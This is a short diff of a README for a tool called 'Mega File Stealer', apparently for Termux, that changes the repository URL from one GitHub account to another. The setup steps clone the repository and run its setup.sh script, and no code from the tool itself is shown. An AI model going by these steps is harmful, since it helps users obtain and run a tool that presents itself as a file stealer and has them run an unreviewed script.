@@ -17,9 +17,9 @@ Get mega files 🥰🥰🥰
 ## Installation and Setup:
 > pkg install git -y
 
-> git clone https://github.com/ZechBron/Mega-File-Stealer
+> git clone https://github.com/Malik332/MEGA-FILE-STEALER
 
-> cd Mega-File-Stealer
+> cd MEGA-FILE-STEALER
 
 > bash setup.sh
 
